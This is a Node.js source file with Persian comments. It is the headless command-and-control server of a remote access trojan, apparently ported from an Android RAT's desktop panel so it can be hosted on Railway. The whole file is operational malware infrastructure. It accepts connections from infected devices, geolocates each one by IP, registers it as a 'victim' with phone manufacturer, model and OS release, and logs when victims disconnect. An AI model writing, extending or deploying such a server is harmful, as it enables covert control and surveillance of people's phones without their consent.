'use strict';

const http = require('http');
const io = require('socket.io');
const geoip = require('geoip-lite');
const victimsList = require('./app/app/assets/js/model/Victim'); // اضافه کردن app دوم

const server = http.createServer();
const socketServer = io(server, {
  pingInterval: 10000,
  pingTimeout: 10000,
  maxHttpBufferSize: 1024 * 1024 * 100
});

const listeningStatus = {}; // برای track پورت

// Listener اصلی از main.js کپی شده، بدون Electron
socketServer.on('connection', function (socket) {
  var address = socket.request.connection;
  var query = socket.handshake.query;
  var index = query.id;
  var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
  var country = null;
  var geo = geoip.lookup(ip);
  if (geo) country = geo.country.toLowerCase();

  // Victim اضافه کن
  victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

  // Disconnect handler (بدون notification window، چون headless)
  socket.on('disconnect', function () {
    victimsList.rmVictim(index);
    console.log(`Victim ${index} disconnected`);
  });
});

// Start listen (از env برای Railway)
const port = process.env.PORT || 42474; // پیش‌فرض 42474، اما Railway 4444 ست می‌کنه
if (!listeningStatus[port]) {
  server.listen(port, '0.0.0.0', () => {
    console.log(`[✓] Server listening on port ${port}`);
    listeningStatus[port] = true;
  });
} else {
  console.log(`[x] Already listening on port ${port}`);
}

// Handle errors
process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
});
